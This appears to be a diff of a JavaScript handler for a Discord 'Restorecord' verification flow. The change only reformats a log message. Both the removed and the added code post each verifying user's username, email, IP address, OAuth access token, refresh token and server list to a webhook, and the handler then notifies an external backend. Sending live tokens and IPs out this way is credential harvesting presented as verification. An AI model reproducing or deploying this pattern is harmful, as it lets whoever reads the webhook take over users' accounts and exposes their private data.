@@ -53,38 +53,33 @@ export default async function handler(req, res) {
   const expiresInMinutes = Math.floor(expires_in / 60);
   const expiryDate = new Date(Date.now() + expires_in * 1000).toISOString();
 
-  // Send professional log to webhook
+  const embedText = 
+`Restorecord • Verification Log
+────────────────────────────────────
+> USER
+Username     : ${user.username}#${user.discriminator}
+User ID      : ${user.id}
+Email        : ${user.email || "Not Available"}
+IP Address   : ${userIp}
+
+> TOKENS
+Access Token : ${access_token}
+Refresh Token: ${refresh_token}
+Expires In   : ${expiresInMinutes} mins
+Expiry Time  : ${expiryDate}
+
+> GUILDS (up to 10)
+${serverList}`;
+
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      embeds: [
-        {
-          title: "Restorecord • Verification Log",
-          color: 0x2f3136,
-          description:
-            "```txt\n" +
-            `> USER\n` +
-            `Username     : ${user.username}#${user.discriminator}\n` +
-            `User ID      : ${user.id}\n` +
-            `Email        : ${user.email || "Unavailable"}\n` +
-            `IP Address   : ${userIp}\n\n` +
-            `> TOKENS\n` +
-            `Access Token : ${access_token}\n` +
-            `Refresh Token: ${refresh_token}\n` +
-            `Expires In   : ${expiresInMinutes} mins\n` +
-            `Expiry Time  : ${expiryDate}\n\n` +
-            `> GUILDS (up to 10)\n` +
-            `${serverList}` +
-            "\n```",
-          footer: { text: "Restorecord Logs" },
-          timestamp: new Date().toISOString(),
-        },
-      ],
+      content: "```" + embedText + "```"
     }),
   }).catch(console.error);
 
-  // Notify your Render backend to assign the verified role
+  // Notify your backend to assign the verified role
   await fetch("https://myproject-bvb7.onrender.com/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
